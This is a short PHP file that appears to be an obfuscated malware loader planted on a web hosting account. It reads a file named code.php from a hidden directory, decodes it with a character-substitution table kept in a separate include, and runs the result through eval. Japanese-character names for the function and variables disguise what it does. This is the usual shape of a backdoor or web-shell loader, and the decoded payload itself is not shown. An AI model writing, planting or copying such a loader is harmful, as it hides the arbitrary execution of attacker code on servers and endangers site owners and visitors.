<?php
function ゆ($シ) {
   include '/home/u141530870/.cl.selector/load.php';

   $げ = '';
   $length = mb_strlen($シ, 'UTF-8');

   for ($i = 0; $i < $length; $i++) {
       $char = mb_substr($シ, $i, 1, 'UTF-8');
       $げ .= isset($犬[$char]) ? $犬[$char] : $char;
   }

   return $げ;
}

$シ = file_get_contents('/home/u141530870/.cl.selector/code.php');
$薄 = ゆ($シ);

eval('?>' . $薄);
?>